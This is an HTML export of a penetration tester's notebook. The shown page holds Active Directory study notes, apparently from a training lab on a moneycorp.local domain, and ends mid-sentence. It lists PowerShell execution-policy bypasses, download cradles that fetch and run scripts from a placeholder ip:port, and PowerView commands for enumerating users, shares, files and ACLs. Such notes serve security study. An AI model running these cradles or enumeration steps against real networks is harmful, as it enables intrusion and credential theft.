<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>ad-notes-chirag</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="styles.css" type="text/css" />
</head>
<body><div class="main"><div class="tree">
<p><strong>Index</strong></p>
<p><a href="trash.html">trash</a></p>

<p><a href="lockpicking.html">lockpicking</a></p>

<ol>
<li><a href="lockpicking--blackbox_picking.html">blackbox picking</a></li>
</ol>
<p><a href="new_folder_2.html">new folder 2</a></p>

<p><a href="Commands.html">Commands</a></p>

<ol>
<li><a href="Commands--arp-spoof.html">arp-spoof</a></li>
<li><a href="Commands--wp-scan.html">wp-scan</a></li>
<li><a href="Commands--put-http.html">put-http</a></li>
<li><a href="Commands--crackmapexec.html">crackmapexec</a></li>
<li><a href="Commands--redis.html">redis</a></li>
<li><a href="Commands--sshuttle.html">sshuttle</a></li>
<li><a href="Commands--c~.html">c#</a></li>
<li><a href="Commands--nikto-proxy.html">nikto-proxy</a></li>
<li><a href="Commands--gather-gpp-creds.html">gather-gpp-creds</a></li>
<li><a href="Commands--webdav.html">webdav</a></li>
<li><a href="Commands--trash.html">trash</a></li>
<li><a href="Commands--nessus-openvas.html">nessus-openvas</a></li>
<li><a href="Commands--mimikatz.html">mimikatz</a></li>
<ol>
<li><a href="Commands--mimikatz--mimikatz_-_remote_control,_rpc.html">mimikatz - remote control, rpc</a></li>
<li><a href="Commands--mimikatz--mimikatz_-_list_commands_in_module.html">mimikatz - list commands in module</a></li>
<li><a href="Commands--mimikatz--mimikatz_-_start_and_stop_processes.html">mimikatz - start and stop processes</a></li>
<li><a href="Commands--mimikatz--mimikatz_-_applocker_bypass_and_other_sn.html">mimikatz - applocker bypass and other sn</a></li>
<li><a href="Commands--mimikatz--mimikatz_-_rdp.html">mimikatz - rdp</a></li>
<li><a href="Commands--mimikatz--mimikatz_-_avoid_new_events.html">mimikatz - avoid new events</a></li>
<li><a href="Commands--mimikatz--mimikatz_list_modules.html">mimikatz list modules</a></li>
<li><a href="Commands--mimikatz--mimikatz_-_tokens.html">mimikatz - tokens</a></li>
<li><a href="Commands--mimikatz--mimikatz_-_base64_all_the_things.html">mimikatz - base64 all the things</a></li>
</ol>
<li><a href="Commands--masscan.html">masscan</a></li>
<li><a href="Commands--nmap_and_scanning.html">nmap and scanning</a></li>
<li><a href="Commands--shellshock-squid.html">shellshock-squid</a></li>
<li><a href="Commands--virtual-box_guest_additions.html">virtual-box guest additions</a></li>
<li><a href="Commands--rbash.html">rbash</a></li>
<li><a href="Commands--ping_sweep.html">ping sweep</a></li>
<li><a href="Commands--cut_commands.html">cut commands</a></li>
<li><a href="Commands--mount-shares.html">mount-shares</a></li>
<li><a href="Commands--lateral_movement.html">lateral movement</a></li>
<li><a href="Commands--xss-iframe.html">xss-iframe</a></li>
<li><a href="Commands--dns-zone-transfer.html">dns-zone-transfer</a></li>
<li><a href="Commands--nginx-bypass.html">nginx-bypass</a></li>
<li><a href="Commands--spawn_a_better_shell_-_break_out_of_shit.html">spawn_a_better_shell - break out of shit</a></li>
<li><a href="Commands--port-forward.html">port-forward</a></li>
<li><a href="Commands--physical_hacking.html">physical hacking</a></li>
<ol>
<li><a href="Commands--physical_hacking--rasperry_pi.html">rasperry pi</a></li>
<li><a href="Commands--physical_hacking--bash_bunny.html">bash bunny</a></li>
</ol>
<li><a href="Commands--searchsploit.html">searchsploit</a></li>
<li><a href="Commands--custom-payloads.html">custom-payloads</a></li>
<li><a href="Commands--bypass_applocker_-_live_off_land.html">bypass applocker - live off land</a></li>
<ol>
<li><a href="Commands--bypass_applocker_-_live_off_land--msbuild.html">msbuild</a></li>
<li><a href="Commands--bypass_applocker_-_live_off_land--installutil.html">installutil</a></li>
<li><a href="Commands--bypass_applocker_-_live_off_land--demiguise.html">demiguise</a></li>
<li><a href="Commands--bypass_applocker_-_live_off_land--mshta.html">mshta</a></li>
<li><a href="Commands--bypass_applocker_-_live_off_land--regsvcs.html">regsvcs</a></li>
<li><a href="Commands--bypass_applocker_-_live_off_land--pubprn.vbs.html">pubprn.vbs</a></li>
<li><a href="Commands--bypass_applocker_-_live_off_land--regasm_2.html">regasm 2</a></li>
<li><a href="Commands--bypass_applocker_-_live_off_land--vbs_macro.html">vbs macro</a></li>
</ol>
<li><a href="Commands--pass_the_hash.html">pass the hash</a></li>
<li><a href="Commands--snmp.html">snmp</a></li>
<li><a href="Commands--client-side-iframe-attack.html">client-side-iframe-attack</a></li>
<li><a href="Commands--mortar-shells.html">mortar-shells</a></li>
<li><a href="Commands--bypass-uac.html">bypass-uac</a></li>
<li><a href="Commands--privilege-escalation-linux.html">privilege-escalation-linux</a></li>
<li><a href="Commands--rdesktop_and_screen_for_linux.html">rdesktop and screen for linux</a></li>
<li><a href="Commands--password-cracking.html">password-cracking</a></li>
<li><a href="Commands--cobalt_strike_2.html">cobalt strike 2</a></li>
<ol>
<li><a href="Commands--cobalt_strike_2--cobalt_strike_certificates.html">cobalt strike certificates</a></li>
<li><a href="Commands--cobalt_strike_2--malleable.html">malleable</a></li>
<li><a href="Commands--cobalt_strike_2--cpl_resource_runner_payload.html">cpl resource runner payload</a></li>
<li><a href="Commands--cobalt_strike_2--situational_awareness_-_harmj0y.html">situational awareness - harmj0y</a></li>
<li><a href="Commands--cobalt_strike_2--go_daddy_domain.html">go daddy domain</a></li>
<li><a href="Commands--cobalt_strike_2--safety.html">safety</a></li>
<li><a href="Commands--cobalt_strike_2--random_commands.html">random commands</a></li>
<li><a href="Commands--cobalt_strike_2--playbook.html">playbook</a></li>
<ol>
<li><a href="Commands--cobalt_strike_2--playbook--privilege_escalation.html">privilege escalation</a></li>
<li><a href="Commands--cobalt_strike_2--playbook--lateral_movement.html">lateral movement</a></li>
<li><a href="Commands--cobalt_strike_2--playbook--overpass_the_hash_with_rubeus-beacon_-_h.html">overpass the hash with rubeus-beacon - h</a></li>
<li><a href="Commands--cobalt_strike_2--playbook--after_initial_access.html">after initial access</a></li>
<li><a href="Commands--cobalt_strike_2--playbook--persistence.html">persistence</a></li>
<li><a href="Commands--cobalt_strike_2--playbook--mail_and_smtp_enumeration-manipulation.html">mail and smtp enumeration-manipulation</a></li>
</ol>
<li><a href="Commands--cobalt_strike_2--generating_certificates.html">generating certificates</a></li>
<li><a href="Commands--cobalt_strike_2--github_repos.html">github repos</a></li>
<li><a href="Commands--cobalt_strike_2--golden_ticket.html">golden ticket</a></li>
<li><a href="Commands--cobalt_strike_2--apache_rewrite_.htaccess.html">apache rewrite .htaccess</a></li>
<li><a href="Commands--cobalt_strike_2--malware_av_evasion.html">malware av evasion</a></li>
<ol>
<li><a href="Commands--cobalt_strike_2--malware_av_evasion--main.go.html">main.go</a></li>
</ol>
<li><a href="Commands--cobalt_strike_2--c2_infrastructure.html">c2 infrastructure</a></li>
<li><a href="Commands--cobalt_strike_2--sid_hopping.html">sid hopping</a></li>
</ol>
<li><a href="Commands--random_shellcode_-_scratch-pad.html">random shellcode - scratch-pad</a></li>
<li><a href="Commands--powerview.html">powerview</a></li>
<ol>
<li><a href="Commands--powerview--new_page.html">new page</a></li>
</ol>
<li><a href="Commands--windows.html">windows</a></li>
<ol>
<li><a href="Commands--windows--windows_-_powerview_3.0,_harmj0y.html">windows - powerview 3.0, harmj0y</a></li>
<li><a href="Commands--windows--windows_passwords.html">windows passwords</a></li>
<li><a href="Commands--windows--windows_-_search_4_loot.html">windows - search 4 loot</a></li>
<li><a href="Commands--windows--windows_-_laps_abuse.html">windows - laps abuse</a></li>
<li><a href="Commands--windows--windows_-_powershell_web_access.html">windows - powershell web access</a></li>
<li><a href="Commands--windows--windows_-_port_forward.html">windows - port forward</a></li>
<li><a href="Commands--windows--windows_privesc.html">windows privesc</a></li>
<li><a href="Commands--windows--windows_enumeration.html">windows enumeration</a></li>
<li><a href="Commands--windows--windows_-_uninstall_patches.html">windows - uninstall patches</a></li>
<li><a href="Commands--windows--windows_-_powerview,_enumerate_groups-ac.html">windows - powerview, enumerate groups-ac</a></li>
<li><a href="Commands--windows--windows_-_powerview_acl_enum-abuse.html">windows - powerview acl enum-abuse</a></li>
<li><a href="Commands--windows--windows_service_abuse.html">windows service abuse</a></li>
<li><a href="Commands--windows--windows_firewall.html">windows firewall</a></li>
<li><a href="Commands--windows--windows_-_powershell_-_quickies.html">windows - powershell - quickies</a></li>
</ol>
<li><a href="Commands--outlook_and_owa.html">outlook and owa</a></li>
<li><a href="Commands--tmux_2.html">tmux 2</a></li>
<ol>
<li><a href="Commands--tmux_2--tmux_config.html">tmux config</a></li>
<li><a href="Commands--tmux_2--tmux_cheat_sheet.html">tmux cheat sheet</a></li>
</ol>
<li><a href="Commands--reverse_shell_one_liners.html">reverse shell one liners</a></li>
<ol>
<li><a href="Commands--reverse_shell_one_liners--java_reverse_shell.html">java reverse shell</a></li>
<li><a href="Commands--reverse_shell_one_liners--python_reverse_shell.html">python reverse shell</a></li>
<li><a href="Commands--reverse_shell_one_liners--php-reverse-shell.html">php-reverse-shell</a></li>
<li><a href="Commands--reverse_shell_one_liners--perl-reverse-shell-cgi-format.html">perl-reverse-shell-cgi-format</a></li>
<li><a href="Commands--reverse_shell_one_liners--c-language-reverse-shell.html">c-language-reverse-shell</a></li>
<li><a href="Commands--reverse_shell_one_liners--ruby.html">ruby</a></li>
</ol>
<li><a href="Commands--tar.html">tar</a></li>
<li><a href="Commands--ssh.html">ssh</a></li>
<li><a href="Commands--named_pipes.html">named pipes</a></li>
<li><a href="Commands--enumeration.html">enumeration</a></li>
<li><a href="Commands--python.html">python</a></li>
<li><a href="Commands--nac_testing.html">nac testing</a></li>
<li><a href="Commands--red_team.html">red team</a></li>
<ol>
<li><a href="Commands--red_team--privilege_escalation.html">privilege escalation</a></li>
<li><a href="Commands--red_team--lateral_movement.html">lateral movement</a></li>
<li><a href="Commands--red_team--privilege_escalation_across_trusts.html">privilege escalation across trusts</a></li>
<li><a href="Commands--red_team--active_directory_one_liners.html">active directory one liners</a></li>
<li><a href="Commands--red_team--enumeration.html">enumeration</a></li>
<li><a href="Commands--red_team--persistence_techniques.html">persistence techniques</a></li>
<li><a href="Commands--red_team--abusing_sql_server_trusts.html">abusing sql server trusts</a></li>
<ol>
<li><a href="Commands--red_team--abusing_sql_server_trusts--privilege_escalation.html">privilege escalation</a></li>
<li><a href="Commands--red_team--abusing_sql_server_trusts--post_exploitation_enumeration.html">post exploitation enumeration</a></li>
</ol>
<li><a href="Commands--red_team--domain_privilege_escalation.html">domain privilege escalation</a></li>
<li><a href="Commands--red_team--file_servers_and_files.html">file servers and files</a></li>
<li><a href="Commands--red_team--bloodhound.html">bloodhound</a></li>
<li><a href="Commands--red_team--forest_enumeration.html">forest enumeration</a></li>
</ol>
<li><a href="Commands--smb-netbios-rpc.html">smb-netbios-rpc</a></li>
<li><a href="Commands--laps.html">laps</a></li>
<li><a href="Commands--password-grep.html">password-grep</a></li>
<li><a href="Commands--xml-xxe-xpath.html">xml-xxe-xpath</a></li>
<li><a href="Commands--ports.html">ports</a></li>
<li><a href="Commands--de-duplicate.html">de-duplicate</a></li>
<li><a href="Commands--mac_address_change.html">mac address change</a></li>
<li><a href="Commands--test-for-xxe.html">test-for-xxe</a></li>
<li><a href="Commands--droopescan.html">droopescan</a></li>
<li><a href="Commands--dnscat.html">dnscat</a></li>
<li><a href="Commands--fresh-install.html">fresh-install</a></li>
<li><a href="Commands--httpscreenshot.html">httpscreenshot</a></li>
<li><a href="Commands--buffer-overflow.html">buffer-overflow</a></li>
<li><a href="Commands--osint.html">osint</a></li>
<li><a href="Commands--spooler_exploit.html">spooler exploit</a></li>
<li><a href="Commands--wifi-hacking.html">wifi-hacking</a></li>
<ol>
<li><a href="Commands--wifi-hacking--aircrack-ng_and_jtr_attack.html">aircrack-ng and jtr attack</a></li>
<li><a href="Commands--wifi-hacking--crack_wep.html">crack wep</a></li>
<li><a href="Commands--wifi-hacking--aircrack-ng.html">aircrack-ng</a></li>
<li><a href="Commands--wifi-hacking--fluxion.html">fluxion</a></li>
<li><a href="Commands--wifi-hacking--reaver.html">reaver</a></li>
<li><a href="Commands--wifi-hacking--wep_shared_key_authentication_attack.html">wep shared key authentication attack</a></li>
<li><a href="Commands--wifi-hacking--cowpatty_attack.html">cowpatty attack</a></li>
<li><a href="Commands--wifi-hacking--new_page.html">new page</a></li>
<li><a href="Commands--wifi-hacking--hostapd.html">hostapd</a></li>
<li><a href="Commands--wifi-hacking--rogue_access_point.html">rogue access point</a></li>
<li><a href="Commands--wifi-hacking--cracking_wpa_attack.html">cracking wpa attack</a></li>
<li><a href="Commands--wifi-hacking--wifite.html">wifite</a></li>
<li><a href="Commands--wifi-hacking--eaphammer.html">eaphammer</a></li>
<li><a href="Commands--wifi-hacking--handshake-via-pcap.html">handshake-via-pcap</a></li>
<li><a href="Commands--wifi-hacking--cracking_wep_via_a_client_attack.html">cracking wep via a client attack</a></li>
<li><a href="Commands--wifi-hacking--basics.html">basics</a></li>
<li><a href="Commands--wifi-hacking--pyrit_attack.html">pyrit attack</a></li>
<li><a href="Commands--wifi-hacking--clientless_wep_attack.html">clientless wep attack</a></li>
</ol>
<li><a href="Commands--images-with-files-in-them.html">images-with-files-in-them</a></li>
<li><a href="Commands--xxd.html">xxd</a></li>
<li><a href="Commands--proxychains.html">proxychains</a></li>
<li><a href="Commands--tools-sources.html">tools-sources</a></li>
<li><a href="Commands--lolbins.html">lolbins</a></li>
<li><a href="Commands--goddi_-_domain_enumeration.html">goddi - domain enumeration</a></li>
<li><a href="Commands--sed_and_changing_files_for_malware_evasi.html">sed and changing files for malware evasi</a></li>
<li><a href="Commands--mail_sniper.html">mail sniper</a></li>
<li><a href="Commands--postgresql.html">postgresql</a></li>
<li><a href="Commands--files-inside-of-pictures.html">files-inside-of-pictures</a></li>
<li><a href="Commands--unicorn_scan.html">unicorn scan</a></li>
<li><a href="Commands--metasploit-meterpreter.html">metasploit-meterpreter</a></li>
<ol>
<li><a href="Commands--metasploit-meterpreter--metasploit_-_reverse_shells.html">metasploit - reverse_shells</a></li>
<li><a href="Commands--metasploit-meterpreter--metasploit-nessus.html">metasploit-nessus</a></li>
<li><a href="Commands--metasploit-meterpreter--meterpreter.html">meterpreter</a></li>
<li><a href="Commands--metasploit-meterpreter--network.html">network</a></li>
</ol>
<li><a href="Commands--compiling-code.html">compiling-code</a></li>
<li><a href="Commands--remote_and_local_file_inclusion.html">remote and local file inclusion</a></li>
<li><a href="Commands--proxychains-admin-network.html">proxychains-admin-network</a></li>
<li><a href="Commands--linux.html">linux</a></li>
<li><a href="Commands--privilege-escalation-windows_-_and_empir.html">privilege-escalation-windows - and empir</a></li>
<li><a href="Commands--powershell.html">powershell</a></li>
<ol>
<li><a href="Commands--powershell--constrained_language_breakout.html">constrained language breakout</a></li>
<li><a href="Commands--powershell--powerup_-_privilege_escalation.html">powerup - privilege escalation</a></li>
<li><a href="Commands--powershell--user_enumeration.html">user enumeration</a></li>
<li><a href="Commands--powershell--powershell_-_get-system.html">powershell - get-system</a></li>
<li><a href="Commands--powershell--powershell_sans_cheat.html">powershell sans cheat</a></li>
<li><a href="Commands--powershell--find_files_by_name.html">find files by name</a></li>
<li><a href="Commands--powershell--random_powershell.html">random powershell</a></li>
<li><a href="Commands--powershell--domain_enumeration.html">domain enumeration</a></li>
<li><a href="Commands--powershell--enable_psremoting.html">enable psremoting</a></li>
</ol>
<li><a href="Commands--sql.html">sql</a></li>
<li><a href="Commands--waf.html">waf</a></li>
<li><a href="Commands--network-change-ip.html">network-change-ip</a></li>
<li><a href="Commands--merlin.html">merlin</a></li>
<li><a href="Commands--web_discovery.html">web discovery</a></li>
<li><a href="Commands--exploit-pack.html">exploit-pack</a></li>
<li><a href="Commands--get-browserdata.html">get-browserdata</a></li>
<li><a href="Commands--user_agent.html">user agent</a></li>
<li><a href="Commands--group-policy-decrypt-passwords.html">group-policy-decrypt-passwords</a></li>
<li><a href="Commands--root_user_add.html">root_user_add</a></li>
<li><a href="Commands--hex_encode_command_line.html">hex encode command line</a></li>
<li><a href="Commands--block-ip-iptables.html">block-ip-iptables</a></li>
<li><a href="Commands--host_discovery-dns.html">host_discovery-dns</a></li>
<li><a href="Commands--certificate_tls_and_ssl.html">certificate tls and ssl</a></li>
<li><a href="Commands--wget.html">wget</a></li>
<li><a href="Commands--php-shells.html">php-shells</a></li>
<li><a href="Commands--payloads.html">payloads</a></li>
<li><a href="Commands--ad-notes.html">ad-notes</a></li>
<ol>
<li><a href="Commands--ad-notes--laps_abuse.html">laps abuse</a></li>
<li><a href="Commands--ad-notes--more-ad-notes.html">more-ad-notes</a></li>
<li><a href="Commands--ad-notes--ad-notes-chirag.html">ad-notes-chirag</a></li>
<li><a href="Commands--ad-notes--pam_abuse.html">pam abuse</a></li>
</ol>
<li><a href="Commands--have_a_shell.html">have_a_shell</a></li>
<li><a href="Commands--curl-wget.html">curl-wget</a></li>
<li><a href="Commands--shell-for-buffer-overflow.html">shell-for-buffer-overflow</a></li>
<li><a href="Commands--__NOTEBOOK__.html">__NOTEBOOK__</a></li>
<ol>
<li><a href="Commands--__NOTEBOOK__--icons.html">icons</a></li>
<li><a href="Commands--__NOTEBOOK__--lost_found.html">lost_found</a></li>
<li><a href="Commands--__NOTEBOOK__--orphans.html">orphans</a></li>
</ol>
<li><a href="Commands--netcat-ftp.html">netcat-ftp</a></li>
<li><a href="Commands--responder.html">responder</a></li>
<li><a href="Commands--assembly.html">assembly</a></li>
</ol>
<p><a href="mobile.html">mobile</a></p>

<ol>
<li><a href="mobile--smali_and_baksmali.html">smali and baksmali</a></li>
<li><a href="mobile--dex2jar.html">dex2jar</a></li>
<li><a href="mobile--apktool.html">apktool</a></li>
<li><a href="mobile--baby_steps.html">baby steps</a></li>
<li><a href="mobile--jd-gui.html">jd-gui</a></li>
<li><a href="mobile--qark.html">qark</a></li>
</ol>
<p><a href="mainframe.html">mainframe</a></p>

<ol>
<li><a href="mainframe--nmap_stuff_-_recon.html">nmap stuff - recon</a></li>
<li><a href="mainframe--tso_commands.html">tso commands</a></li>
</ol>
<p><a href="links_and_random.html">links and random</a></p>

<ol>
<li><a href="links_and_random--mimikatz.html">mimikatz</a></li>
<li><a href="links_and_random--wifi_driver_stuff.html">wifi driver stuff</a></li>
<li><a href="links_and_random--bypassing_applocker_living_off_land.html">bypassing applocker living off land</a></li>
<li><a href="links_and_random--ptx.html">ptx</a></li>
</ol></div>
<div class="page"><h1><b><u>ad-notes-chirag</u></b></h1>   Active Directory enables centralized secure management of an entire network. Everything stored in active directory is an object.<br /><br />##Active Directory - Components<br /><br />• Schema - Defines objects and their attributes (Windows User, Servers etc).<br />• Query and Index mechanism - Provides searching and publication of objects and their properties.<br />• Global Catalog - Contains information about every object in the directory.<br />• Replication Service - Distributes information across domain controllers.<br /><br />##Active Directory - Structure<br />Forest, domains and organization units(OUs) are the basic building blocks of any active directory structure.<br />Forest - A forest is the security boundary as per Microsoft may contain multiple domains and each domain may contain multiple OUs.<br /><br />##Powershell - Basics<br />Powershell scripts uses cmdlets, native commands, functions, .Net, DLLs, Windows API and much more in a single program(script).Powershell scripts are really powerfull and could do much stuff in less lines. Easy to write, easy syntax and easy to execute.<br />#Execution Policy<br />It is not a security measure, It is present to prevent user from accidently executing scripts.<br />There are several ways to bypass it <br />powershell -ExecutionPolicy bypasspowershell -ep Bypass$env:PSExecutionPolicyPreference = "bypass"<br /><br />#Get-Help<br />Get-Help Get-Item -- Shows a brief help about the cmdlet or topic. Supports wildcard (*). Comes with various options and filters. Get-Help -? or help -? -- could be used to display help.Get-Help About_&lt;topic&gt; could be used to get help for conceptual topics<br />Get-Help * --Lists everything about the help topics.<br />Get-Help process --List everything which contains the word process.<br />Update-Help --Updates the help system (v3+)<br />Get-Help Get-Item -Full --List full help about a topic (Get-Item cmdlet in this case).<br />Get-Help Get-Item -Examples --Lists example of how to run a cmdlet (Get-Item cmdlet in this case).<br /><br />#What is cmdlets ?<br />Cmdlets are used to perform an action and a .Net object is returned as the output. Cmdlets accept parameters for different operations. They have aliases. There are NOT executables, you can write your own cmdlet with few lines of script. Get-Command -CommandType cmdlet -- This list all the cmdlets in the current powershell session<br />Get-Process --Lists processes running on the system.<br /><br />#Powershell Modules basic<br />Import-Module &lt;modulepath&gt;<br />Get-Command -Module &lt;modulename&gt; -- Get all the commands which is imported from the module<br /><br />##Download Cradles<br />iex (New-Object Net.WebClient).DownloadString('<a href="http://ip:port/file.ps1">http://ip:port/file.ps1</a>')<br />$ie=New-Object -ComObject InternetExplorer.Application;$ie.visible=$False;$ie.navigate('<a href="http://ip:port/file.ps1%27%29%3B">http://ip:port/file.ps1');</a>sleep 5;$response=$ie.Document.body.innerHTML;$ie.quit();iex $response<br />#Powershell v3 onwards<br />iex(iwr '<a href="http://ip:port/file.ps1">http://ip:port/file.ps1</a>')<br />$h = New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET', '<a href="http://ip:port/file.ps1">http://ip:port/file.ps1</a>', $false);$h.send();iex $h.responseText<br />$wr = [<a href="http://System.Net.WebRequest">System.Net.WebRequest</a>]::Create("<a href="http://ip:port/file.ps1">http://ip:port/file.ps1</a>")$r = $wr.GetResponse()iex([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()<br /><br />##How to interact with active directory in lab<br /><br />• [ADSI]<br />• .Net Classes (System.DirectoryServices.ActiveDirectory)<br />• Native Executables<br />• Powershell (.Net Classes &amp; WMI)<br /><br />Domain Enumeration<br />Enumeration is most important during any engagement. Command to find the current domain name using .Net Classes<br />$ADClass = [System.DirectoryServices.ActiveDirectory.Domain]$ADClass::GetCurrentDomain()<br />Load PowerView<br />cd C:\AD\Tools. .\PowerView.ps1<br />Load AD Module<br />cd C:\AD\Tools\ADModule-master\Import-Module .\Microsoft.ActiveDirectory.Management.dllImport-Module .\ActiveDirectory\ActiveDirectory.psd1<br />Get Current Domain Information<br />#PowerViewGet-NetDomain<br />#AD ModuleGet-ADDomain<br />Get object of another domain<br />#PowerViewGet-NetDomain -Domain moneycorp.local<br />#AD ModuleGet-ADDomain -Identity moneycorp.local<br />Find Domain SID<br />#PowerViewGet-DomainSID<br />#AD Module(Get-ADDomain).DomainSID<br />Get Domain policy for current domain<br />#PowerViewGet-DomainPolicy(Get-DomainPolicy)."system access" --Password Policy<br />(Get-DomainPolicy)."Kerberos Policy" --Kerberos Policy<br />Get Domain policy from another domain<br />(Get-DomainPolicy -domain moneycorp.local)."system access"<br />Get domain controller information for current domain<br />#PowerViewGet-NetDomainController<br />#AD ModuleGet-ADDomainController<br />Get domain controller information for another domian<br />#PowerViewGet-NetDomainController -Domain moneycorp.local<br />#AD ModuleGet-ADDomainController -DomainName moneycorp.local -Discover<br />Get list of all users in the current domain<br />#PowerViewGet-NetUser<br />#AD ModuleGet-ADUser -Filter * -Properties *<br />Get the details for specific user in the current domain<br />#PowerViewGet-NetUser -Username student1<br />#AD ModuleGet-ADUser -Identity student1 -Properties *<br />Get list of all properties for the users in the current domain<br />#PowerViewGet-UserProperty<br />#AD ModuleGet-ADUser -Filter * -Properties * | select -First 1 | Get-Member -MemberType *Property |  select Name<br />Get list of specific property for all users in the current domain<br />#PowerViewGet-UserProperty -Properties pwdlastset<br />#AD ModuleGet-ADUser -Filter * -Properties * |  select name,@{expression={[datetime]::fromFileTime($_.pwdlastset)}}<br />Search for a particular string in a user's attributes<br />#PowerViewFind-UserField -SearchField Description -SearchTerm "built"<br />#AD ModuleGet-ADUser -Filter 'Description -like "*built*"' -Properties Description | select name,Description<br />Get list of computers in the current domain<br />#PowerViewGet-NetComputer<br />#AD ModuleGet-ADComputer -Filter *<br />Get all the not null properties for the computers<br />#PowerViewGet-NetComputer -FullData<br />#AD ModuleGet-ADComputer -Filter * -Properties *<br />Get list of computers running server 2016 computers<br />#PowerViewGet-NetComputer -OperatingSystem "*Server 2016*"<br />#AD ModuleGet-ADComputer -Filter 'OperatingSystem -like "*Server 2016*" -Properties OperatingSystem | select Name,OperatingSystem<br />Check if the computers are alive. This will ping the computers in the network. Possibilities of false positive if ping is block in the network crossing firewalls.<br />#PowerViewGet-NetComputer -Ping<br />#AD ModuleGet-ADComputer -Filter * -Properties DNSHostName | %{Test-Connection -Count 1 -ComputerName $_.DNSHostName}<br />Get information about the Groups from current domain<br />#PowerViewGet-NetGroup<br />#AD ModuleGet-ADGroup -Filter *<br />Get information about the Groups from another domain<br />#PowerViewGet-NetGroup -Domain moneycorp.local<br />#AD ModuleGet-ADGroup -Filter * -Server moneycorp.local<br />Get full information about the Group from the current domain<br />#PowerViewGet-NetGroup 'Domain Admins' -FullData<br />#AD ModuleGet-ADGroup -Filter * -Properties<br />Get information about the Group using wildcard search<br />#PowerViewGet-NetGroup -GroupName *admin*<br />#AD ModuleGet-ADGroup -Filter 'Name -like "*admin*"' | select name<br />Get the member list from the groups<br />#PowerViewGet-NetGroupMember -GroupName "Domain Admins" -Recurse<br />#AD ModuleGet-ADGroupMember -Identity "Domain Admins" -Recursive<br />Get group membership for a user<br />#PowerViewGet-NetGroup -UserName "student1"<br />#AD ModuleGet-ADPrincipalGroupMembership -Identity student1<br />Get list of all the local groups on a machine (needs administrator privileges on non dc machine)<br />#PowerViewGet-NetLocalGroup -ComputerName dcorp-dc.dollarcorp.moneycorp.local -ListGroups<br />Get members of all the local groups on a machine (needs administrator privileges on non dc machine)<br />#PowerViewGet-NetLocalGroup -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Recurse<br />Get actively logged users on a computer (need local admin rights on the target)<br />#PowerViewGet-NetLoggedon -ComputerName &lt;servername&gt;<br />Get locally logged users on a computer (needs remote registry on the target -started by-default on server os)<br />#PowerViewGet-LoggedonLocal -Computer dcorp-dc.dollarcorp.moneycorp.local<br />Get the last logged user on a computer (needs administrative rights and remote registry on the target)<br />#PowerViewGet-LastLoggedOn -ComputerName &lt;servername&gt;<br />Find shares on hosts in the current domain which are readable<br />#PowerViewInvoke-ShareFinder -Verbose<br />Find shares on hosts in the current domain which are readable excluding default shares<br />#PowerViewInvoke-ShareFinder -Verbose -ExcludeStandard -ExcludePrint -ExcludeIPC<br />Find sensitive files on computers in the domain<br />#PowerViewInvoke-FileFinder -Verbose<br />Get all file servers of the domain<br />#PowerViewGet-NetFileServer<br />##What is Group Policy ?<br />Group Policy provides the ability to manage configuration and changes easily &amp; centrally in AD<br />Allows Configuration of - <br />• Security Settings<br />• Registry-based policy settings<br />• Group policy preferences like startup/shutdown/log-on/logoff scripts settings<br />• Software Installation<br />GPO can be abused for various attacks like privilege escalation, backdoors, persistence etc.<br />Find all the group policy in the current domain<br />#PowerViewGet-NetGPO<br />Find all the group policy display name<br />#PowerViewGet-NetGPO | select displayname<br />Find the group policy applied on the student machine<br />#PowerViewGet-NetGPO -ComputerName dcorp-stdadmin.dollarcorp.moneycorp.local<br />Get users which are in a local group of a machine using GPO<br />#PowerViewFind-GPOComputerAdmin -ComputerName dcorp-stdadmin.dollarcorp.moneycorp.local<br />Get machines where the given user is member of a specific group<br />#PowerViewFind-GPOLocation -UserName student1 -Verbose<br />Get OUs from the current domain<br />#PowerViewGet-NetOU -FullData<br />## Access Control Model<br />Enables control on the ability of a process to access objects and other resources in active directory based on:<br />• Access Tokens (security context of a process - identity and privileges of user)<br />• Security Descriptors (SID of the owner, Discretionary ACL (DACL) and System ACL (SACL))<br />Every object in active directory has 3 things in active directory<br />• SACL<br />• DACL<br />• OwnerDACL &amp; SACL are made of Access Control Entries (ACE)<br /><br />#Access Control List (ACL)<br />It is a list of Access Control Entries (ACE) - ACE corresponds to individual permission or audits access. Who has permission and what can be done on an object ?<br />There are 2 types of ACLs<br />• DACL - Defines the permissions trustees(a user or group) have on an object.<br />• SACL - Logs success and failure audit messages when an object is accessed.<br /><br />#Enumerate ACLs<br />Get the ACLs associated with the specified object<br />#PowerViewGet-ObjectAcl -SamAccountName student1 -ResolveGUIDs<br />Get the ACLs associated with the specified prefix to be used for search<br />#PowerViewGet-ObjectAcl -ADSprefix 'CN=Administrator,CN=Users' -Verbose<br />#AD Module(Get-Acl 'AD:\CN=Administrator,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local').Access<br />Get the ACLs associated with the specified LDAP path to be used for search<br />#PowerViewGet-ObjectAcl -ADSpath "<a href="http://LDAP://CN=Domain">LDAP://CN=Domain</a> Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local" -ResolveGUIDs -Verbose<br />Search for interesting ACEs<br />#PowerViewInvoke-ACLScanner -ResolveGUIDs<br />Get the ACLs associated with the specified path<br />#PowerViewGet-PathAcl -Path "\\dcorp-dc.dollarcorp.moneycorp.local\sysvol"<br /><br />##Domain Trust<br />In an AD environment, trust is a relationship between two domains or forests which allows users of one domain or forest to access resources in the other domain or forest.Trust can be automatic (parent-child, same forest etc). or established (forest, external).Trusted Domain Objects (TDOs) represent the trust relationships in a domain.<br />##Trust Properties<br />There are 2 properties of trust<br />• Trust Direction<br />• Trust Transitivity<br />#Trust Direction<br /><br />• One-Way Trust - Unidirectional. Users in the trusted domain can access resources in the trusting domain but the reverse is not true.<br />• Two-Way Trust - Bi-directional. Users of both domain can access resources in the other domain.<br /><br />#Trust Transitivity<br /><br />• Transitive - Can be extended to establish trust relationships with other domains. All the default intra-forest trust relationships (Tree-root, Parent-Child) between domains within a same are transitive two-way trusts.<br />• Non Transitive - Cannot be extended to other domains in the forest. Can be two-way or one-way. This is the default trust (called external trust) between two domains in different forests when forests do not have a trust relationship.<br />##Types of Trust<br />#Default / Automatic Trusts<br />Parent-Child trust - It is created automatically between the new domain and the domain that precedes it in the namespace hierarchy, whenever a new domain is added in a tree. For example, dollarcorp.moneycorp.local is a child of moneycorp.local. This trust is always two-way transitive.<br 